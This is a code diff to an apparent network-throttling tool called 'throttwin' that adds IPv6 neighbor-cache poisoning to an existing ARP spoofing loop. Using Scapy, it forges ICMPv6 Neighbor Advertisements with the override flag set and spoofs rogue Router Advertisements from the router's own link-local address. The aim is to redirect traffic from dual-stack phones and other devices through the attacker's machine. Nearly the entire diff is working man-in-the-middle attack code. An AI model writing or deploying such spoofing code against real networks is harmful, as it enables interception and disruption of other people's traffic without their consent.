@@ -8,20 +8,23 @@ log = logging.getLogger("throttwin")
 def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
                    my_mac, stop_event, status=None):
     """
-    Continuously send forged ARP replies and ICMPv6 RA deprecation packets:
+    Continuously send forged ARP replies and ICMPv6 NDP/RA spoofing packets:
       - IPv4: ARP-poisons target device and router so IPv4 traffic is captured.
-      - IPv6: Transmits ICMPv6 Router Advertisements with routerlifetime=0 so dual-stack
-        devices (iOS/iPhone, Android, Windows) invalidate the direct IPv6 default gateway
-        and fall back seamlessly to IPv4 (or route through our shaper).
+      - IPv6: Transmits ICMPv6 Router Advertisements with routerlifetime=0 & prefixlifetime=0
+        originating from the router's link-local address, plus ICMPv6 Neighbor Advertisements (NA)
+        with Override=1 to poison IPv6 neighbor caches on dual-stack devices (iPhone/iOS, Android).
     Uses Scapy on Windows via Npcap.
     """
     try:
         from scapy.all import Ether, ARP, sendp, conf as scapy_conf
-        from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo
-        from .network import get_scapy_interface, get_interface_ipv6_link_local, get_interface_ipv6_prefixes
+        from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptPrefixInfo, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
+        from .network import get_scapy_interface, get_interface_ipv6_link_local, get_interface_ipv6_prefixes, mac_to_ipv6_ll
         npf_iface = get_scapy_interface(interface)
         my_ll_ipv6 = get_interface_ipv6_link_local(interface)
+        router_ipv6_ll = mac_to_ipv6_ll(router_mac)
+        target_ipv6_ll = mac_to_ipv6_ll(target_mac)
 
+        # ── 1. IPv4 ARP Poisoning Packets ──────────────────────────────────────────
         # Packet: tell target "I am the router" (IPv4)
         pkt_to_target = (
             Ether(dst=target_mac, src=my_mac) /
@@ -35,10 +38,26 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
                 psrc=target_ip, hwsrc=my_mac)
         )
 
-        # ICMPv6 Rogue RA Packet with Router Lifetime = 0 and SLAAC Prefix Lifetime = 0
-        # Informs dual-stack iOS/Android devices that IPv6 gateway and SLAAC prefixes are expired
+        # ── 2. IPv6 NDP Neighbor Advertisement (NA) Poisoning Packets ──────────────
+        # Tell Target: router's link-local IPv6 is at my_mac (R=1 Router, O=1 Override)
+        pkt_na_to_target = (
+            Ether(dst=target_mac, src=my_mac) /
+            IPv6(src=router_ipv6_ll, dst="ff02::1") /
+            ICMPv6ND_NA(R=1, S=0, O=1, tgt=router_ipv6_ll) /
+            ICMPv6NDOptDstLLAddr(lladdr=my_mac)
+        )
+        # Tell Router: target's link-local IPv6 is at my_mac (R=0 Host, O=1 Override)
+        pkt_na_to_router = (
+            Ether(dst=router_mac, src=my_mac) /
+            IPv6(src=target_ipv6_ll, dst="ff02::1") /
+            ICMPv6ND_NA(R=0, S=0, O=1, tgt=target_ipv6_ll) /
+            ICMPv6NDOptDstLLAddr(lladdr=my_mac)
+        )
+
+        # ── 3. IPv6 Rogue RA Deprecation Packets ───────────────────────────────────
+        # Sourced from the router's real link-local address with routerlifetime=0
         ra_base = (
-            IPv6(src=my_ll_ipv6, dst="ff02::1") /
+            IPv6(src=router_ipv6_ll, dst="ff02::1") /
             ICMPv6ND_RA(routerlifetime=0, chlim=64, prf=3) /
             ICMPv6NDOptSrcLLAddr(lladdr=my_mac)
         )
@@ -61,48 +80,72 @@ def arp_spoof_loop(interface, target_ip, target_mac, router_ip, router_mac,
 
         while not stop_event.is_set():
             try:
+                # Send IPv4 ARP poison
                 sendp(pkt_to_target, iface=npf_iface, verbose=0)
                 sendp(pkt_to_router, iface=npf_iface, verbose=0)
-                # Keep IPv6 suppressed on dual-stack devices so YouTube/Google route through IPv4 shaper
+                # Send IPv6 NDP NA poison
+                sendp(pkt_na_to_target, iface=npf_iface, verbose=0)
+                sendp(pkt_na_to_router, iface=npf_iface, verbose=0)
+                # Send IPv6 SLAAC/RA deprecation
                 sendp(pkt_ra_unicast, iface=npf_iface, verbose=0)
                 sendp(pkt_ra_multicast, iface=npf_iface, verbose=0)
             except Exception as e:
                 log.debug(f"Spoof send error for {target_ip} (interface may be reconnecting): {e}")
                 npf_iface = get_scapy_interface(interface)
-            stop_event.wait(1.5)
+            stop_event.wait(1.0)
 
     except Exception as e:
         log.debug(f"Dual-stack spoof loop exception for {target_ip}: {e}")
     finally:
-        # Restore ARP tables on exit
+        # Restore ARP and NDP tables on exit
         _restore_arp(interface, target_ip, target_mac, router_ip, router_mac, my_mac)
         log.info(f"Dual-stack spoof stopped and restored: {target_ip}")
 
 
 def _restore_arp(interface, target_ip, target_mac, router_ip, router_mac, my_mac):
-    """Send gratuitous ARP replies to restore correct MAC mappings."""
+    """Send gratuitous ARP and NDP replies to restore correct MAC mappings."""
     try:
         from scapy.all import Ether, ARP, sendp
-        from .network import get_scapy_interface
+        from scapy.layers.inet6 import IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
+        from .network import get_scapy_interface, mac_to_ipv6_ll
         npf_iface = get_scapy_interface(interface)
+        router_ipv6_ll = mac_to_ipv6_ll(router_mac)
+        target_ipv6_ll = mac_to_ipv6_ll(target_mac)
 
-        # Tell target: router's real MAC
+        # Tell target: router's real MAC (IPv4)
         restore_target = (
             Ether(dst=target_mac, src=router_mac) /
             ARP(op=2, pdst=target_ip, hwdst=target_mac,
                 psrc=router_ip, hwsrc=router_mac)
         )
-        # Tell router: target's real MAC
+        # Tell router: target's real MAC (IPv4)
         restore_router = (
             Ether(dst=router_mac, src=target_mac) /
             ARP(op=2, pdst=router_ip, hwdst=router_mac,
                 psrc=target_ip, hwsrc=target_mac)
         )
 
+        # Tell target: router's real MAC (IPv6)
+        restore_na_target = (
+            Ether(dst=target_mac, src=router_mac) /
+            IPv6(src=router_ipv6_ll, dst="ff02::1") /
+            ICMPv6ND_NA(R=1, S=0, O=1, tgt=router_ipv6_ll) /
+            ICMPv6NDOptDstLLAddr(lladdr=router_mac)
+        )
+        # Tell router: target's real MAC (IPv6)
+        restore_na_router = (
+            Ether(dst=router_mac, src=target_mac) /
+            IPv6(src=target_ipv6_ll, dst="ff02::1") /
+            ICMPv6ND_NA(R=0, S=0, O=1, tgt=target_ipv6_ll) /
+            ICMPv6NDOptDstLLAddr(lladdr=target_mac)
+        )
+
         for _ in range(4):
             sendp(restore_target, iface=npf_iface, verbose=0)
             sendp(restore_router, iface=npf_iface, verbose=0)
-            time.sleep(0.2)
+            sendp(restore_na_target, iface=npf_iface, verbose=0)
+            sendp(restore_na_router, iface=npf_iface, verbose=0)
+            time.sleep(0.15)
 
     except Exception as e:
         log.warning(f"ARP restore failed for {target_ip}: {e}")
